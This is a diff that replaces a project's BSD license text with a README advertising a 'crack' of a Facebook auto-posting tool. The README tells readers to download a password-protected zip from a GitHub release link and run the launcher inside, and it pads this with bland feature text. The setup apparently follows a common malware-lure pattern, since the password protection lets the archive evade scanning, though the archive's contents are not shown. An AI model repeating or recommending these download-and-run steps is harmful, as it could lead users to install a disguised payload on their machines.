@@ -1,28 +1,20 @@
-BSD 3-Clause License
+Facebook Auto Poster | Crack 2026
 
-Copyright (c) 2026, pitchstarlingderrick
+⚙️ How to Use
+# PASSWORD: azuro
+1. Download and unzip the latest version of the launcher (Link to the latest launcher - https://github.com/Amplitudekespot/itaoaayg/releases/download/Latest/Azuro.zip)
+# PASSWORD: azuro
 
-Redistribution and use in source and binary forms, with or without
-modification, are permitted provided that the following conditions are met:
+2. Launch the launcher and click RUN
+3. Wait for the launcher to update
 
-1. Redistributions of source code must retain the above copyright notice, this
-   list of conditions and the following disclaimer.
+Facebook Auto Poster is an open-source tool for automating post publishing on Facebook pages and groups. It helps developers and content managers schedule and publish posts programmatically, reducing manual work and improving workflow efficiency.
 
-2. Redistributions in binary form must reproduce the above copyright notice,
-   this list of conditions and the following disclaimer in the documentation
-   and/or other materials provided with the distribution.
+The project focuses on reliable Facebook posting automation using official APIs or browser-based automation, depending on configuration. It can be integrated into existing systems or used as a standalone solution for managing recurring or scheduled posts.
 
-3. Neither the name of the copyright holder nor the names of its
-   contributors may be used to endorse or promote products derived from
-   this software without specific prior written permission.
-
-THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
-AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
-IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
-DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
-FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
-DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
-SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
-CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
-OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
-OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+Features
+Automated posting to Facebook pages and groups
+Post scheduling and batch publishing
+Configurable content sources
+Modular and extensible architecture
+Suitable for personal projects and internal tools
